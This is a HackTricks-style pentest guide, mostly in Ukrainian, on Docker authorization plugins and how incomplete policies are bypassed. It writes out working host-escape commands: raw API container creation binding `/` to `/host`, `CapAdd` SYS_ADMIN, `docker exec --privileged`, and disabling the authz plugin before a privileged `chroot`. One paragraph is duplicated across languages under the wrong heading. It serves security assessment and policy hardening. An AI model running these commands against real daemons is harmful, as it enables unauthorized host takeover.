# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Runtime authorization plugins — це додатковий шар політики, який вирішує, чи може викликач виконати певну дію демона. Docker — класичний приклад. За замовчуванням будь-хто, хто може спілкуватися з Docker daemon, фактично має широкий контроль над ним. Authorization plugins намагаються звузити цю модель, перевіряючи автентифіковану особу користувача та запитувану API-операцію, після чого дозволяють або забороняють запит згідно з політикою.

Ця тема заслуговує на окрему сторінку, тому що вона змінює модель експлуатації, коли зловмисник вже має доступ до Docker API або до користувача в групі `docker`. У таких середовищах питання вже не лише «чи можу я досягти демона?», але й «чи захищений демон шаром авторизації, і якщо так — чи можна обійти цей шар через необроблені endpoints, слабкий JSON-парсинг або права управління плагінами?»

## Operation

Коли запит потрапляє до Docker daemon, підсистема авторизації може передати контекст запиту одному або кільком встановленим плагінам. Плагін бачить ідентичність автентифікованого користувача, деталі запиту, вибрані заголовки та частини тіла запиту чи відповіді, якщо тип вмісту дозволяє. Можна ланцюжити декілька плагінів, і доступ надається лише якщо всі плагіни дозволяють запит.

Ця модель здається сильною, але її безпека повністю залежить від того, наскільки повно автор політики розумів API. Плагін, який блокує `docker run --privileged`, але ігнорує `docker exec`, пропускає альтернативні JSON-ключі такі як верхнього рівня `Binds`, або дозволяє адміністрування плагінів, може створити хибне відчуття обмеження, водночас залишаючи відкритими прямі шляхи для escalation привілеїв.

## Common Plugin Targets

Важливі області для перегляду політик:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Історично прикладами були такі плагіни як Twistlock's `authz` та прості освітні плагіни на кшталт `authobot`, які робили цю модель легкою для вивчення, оскільки їхні файли політик та кодові шляхи показували, як насправді реалізовано відповідність endpoint→action. Для оцінювання важливий урок в тому, що автор політики має розуміти повну поверхню API, а не лише найпомітніші CLI-команди.

## Abuse

Перша мета — з’ясувати, що саме блокується. Якщо daemon відхиляє дію, помилка часто leaks назву плагіна, що допомагає ідентифікувати контроль, який використовується:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Якщо вам потрібен ширший профайлінг endpoint-ів, інструменти на кшталт `docker_auth_profiler` корисні, бо вони автоматизують інакше повторювану задачу перевірки, які маршрути API та JSON-структури дійсно дозволені плагіном.

Якщо середовище використовує кастомний плагін і ви можете взаємодіяти з API, перелічіть, які поля об'єктів насправді фільтруються:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ці перевірки важливі, оскільки багато помилок авторизації специфічні для певних полів, а не для загальних концепцій. Плагін може відхилити CLI-шаблон, не заблокувавши повністю еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політика, яка блокує створення привілейованих контейнерів, але дозволяє створення контейнера без обмежень плюс `docker exec`, може все одно бути обійдена:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
If the daemon accepts the second step, the user has recovered a privileged interactive process inside a container the policy author believed was constrained.

### Full Example: Bind Mount Through Raw API

Якщо daemon приймає другий крок, користувач відновлює привілейований інтерактивний процес всередині container, який автор політики вважав обмеженим.

Деякі зламані політики інспектують тільки одну JSON-форму. Якщо root filesystem bind mount не блокується послідовно, host все одно можна змонтувати:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Та сама ідея також може з'явитися під `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Наслідком є повний host filesystem escape. Цікава деталь полягає в тому, що обхід виникає через неповне policy coverage, а не через kernel bug.

### Full Example: Unchecked Capability Attribute

Якщо політика забуває відфільтровувати capability-related attribute, атакуючий може створити container, який знову отримає небезпечну capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Як тільки присутня `CAP_SYS_ADMIN` або інша, не менш потужна capability, багато breakout techniques, описаних у [capabilities.md](protections/capabilities.md) та [privileged-containers.md](privileged-containers.md), стають доступними.

### Повний приклад: Вимкнення плагіна

Якщо дозволені операції plugin-management, найчистіший bypass може полягати у повному вимкненні контролю:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Це помилка політики на рівні control-plane. Шар авторизації існує, але користувач, якого він мав обмежити, все ще має дозвіл вимкнути його.

## Checks

Ці команди призначені для визначення, чи існує шар політики та чи виглядає він повним або поверхневим.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Що цікаво тут:

- Повідомлення про відмову, які містять ім'я плагіна, підтверджують наявність шару авторизації і часто розкривають точну реалізацію.
- Список плагінів, видимий для атакувальника, може бути достатнім, щоб з'ясувати, чи можливі операції відключення або переналаштування.
- Політику, яка блокує лише очевидні CLI-дії, але не сирі API-запити, слід вважати обходною, доки не доведено протилежне.

## Налаштування за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням не ввімкнено | Доступ до демона фактично «все-або-нічого», якщо не налаштовано authz plugin | неповна політика плагінів, чорні списки замість allowlists, дозвіл на керування плагінами, сліпі зони на рівні полів |
| Podman | Не є поширеним прямим еквівалентом | Podman зазвичай більше покладається на Unix-права, виконання без root і рішення щодо експозиції API, ніж на Docker-style authz plugins | широке відкриття rootful Podman API, слабкі права на сокет |
| containerd / CRI-O | Інша модель контролю | Ці рантайми зазвичай покладаються на права сокета, межі довіри на вузлі та механізми контролю оркестратора вищого рівня, а не на Docker authz plugins | монтування сокета в робочі навантаження, слабкі припущення довіри на локальному вузлі |
| Kubernetes | Використовує authn/authz на рівнях API-server та kubelet, а не Docker authz plugins | Cluster RBAC та admission controls є основним шаром політики | надмірно широкі RBAC, слабка admission-політика, пряме відкриття kubelet або runtime API |
